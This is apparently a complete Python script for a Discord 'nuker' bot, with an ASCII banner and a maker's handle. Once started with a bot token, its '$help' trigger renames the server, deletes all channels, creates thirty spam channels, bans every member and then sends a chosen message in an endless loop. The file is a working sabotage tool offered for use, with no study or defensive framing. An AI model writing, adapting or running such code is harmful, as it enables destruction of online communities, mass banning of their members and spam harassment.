import discord
from colorama import Fore, init

colors = ['red', 'yellow', 'green', 'cyan', 'blue', 'magenta']

banner = f"""                            
{Fore.YELLOW} @@@@@@@    @@@@@@   @@@@@@@      @@@  @@@  @@@  @@@  @@@  @@@  @@@@@@@@  @@@@@@@   
 @@@@@@@@  @@@@@@@@  @@@@@@@@     @@@@ @@@  @@@  @@@  @@@  @@@  @@@@@@@@  @@@@@@@@  
 @@!  @@@  @@!  @@@  @@!  @@@     @@!@!@@@  @@!  @@@  @@!  !@@  @@!       @@!  @@@  
 !@   @!@  !@!  @!@  !@!  @!@     !@!!@!@!  !@!  @!@  !@!  @!!  !@!       !@!  @!@  
 @!@!@!@   @!@!@!@!  @!@  !@!     @!@ !!@!  @!@  !@!  @!@@!@!   @!!!:!    @!@!!@!   
 !!!@!!!!  !!!@!!!!  !@!  !!!     !@!  !!!  !@!  !!!  !!@!!!    !!!!!:    !!@!@!    
 !!:  !!!  !!:  !!!  !!:  !!!     !!:  !!!  !!:  !!!  !!: :!!   !!:       !!: :!!   
 :!:  !:!  :!:  !:!  :!:  !:!     :!:  !:!  :!:  !:!  :!:  !:!  :!:       :!:  !:!  
  :: ::::  ::   :::   :::: ::      ::   ::  ::::: ::   ::  :::   :: ::::  ::   :::  
 :: : ::    :   : :  :: :  :      ::    :    : :  :    :   :::  : :: ::    :   : :  
                          {Fore.WHITE}MADE BY RBLXCOLLIN#0001
"""

print(banner)

print(Fore.CYAN, end="")
token = input("[Token]: ")
servername = input("[Server Name]: ")
channelname = input("[Channel Name]: ")
message = input("[Message]: ")

init()

intents = discord.Intents().all()
client = discord.Client(intents=intents)


def bot(token, server_name, channel_name, msg):
    @client.event
    async def on_ready():
        print(f"{Fore.YELLOW}User: {client.user} {Fore.WHITE}- {Fore.YELLOW}Use Command $help to start Nuke")

    @client.event
    async def on_message(message):
        if message.content.startswith('$help'):
            try:
                await message.channel.guild.edit(name=server_name)
                print(f"{Fore.GREEN}[!] Renamed Server to {server_name}")
            except:
                print("[-] Couldn't rename Server")
            channels = client.get_all_channels()
            for channel in channels:
                try:
                    await channel.delete()
                    print(f"{Fore.GREEN}[!] Deleted {channel.name}")
                except:
                    print(f"{Fore.RED}[-] Could not delete {channel.name}")
            new_channels = []
            for i in range(30):
                try:
                    _ = await message.channel.guild.create_text_channel(channel_name)
                    print(f"{Fore.GREEN}[!] Created new Channel")
                    await _.send(msg)
                    new_channels.append(_)
                except:
                    print(f"{Fore.RED}[-] Could not create Channel")
            for member in message.channel.guild.members:
                try:
                    await member.ban()
                    print(f"{Fore.GREEN}[!] Banned {member}")
                except:
                    print(f"{Fore.RED}[-] Could not ban {member}")
            while True:
                for x in new_channels:
                    await x.send(msg)
    
    client.run(token)

bot(token, servername, channelname, message)
